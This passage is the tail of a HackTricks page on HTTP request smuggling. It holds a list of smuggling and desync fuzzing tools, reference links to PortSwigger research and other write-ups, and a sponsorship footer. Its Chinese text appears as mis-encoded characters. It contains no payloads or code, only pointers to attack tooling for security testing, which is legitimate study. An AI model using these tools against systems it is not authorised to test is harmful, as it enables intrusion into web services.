* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): è¿™ä¸ªå·¥å…·æ˜¯åŸºäºè¯­æ³•çš„HTTP Fuzzerï¼Œç”¨äºå‘ç°å¥‡æ€ªçš„è¯·æ±‚æ¬ºéª—å·®å¼‚ã€‚

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚ 

</details>
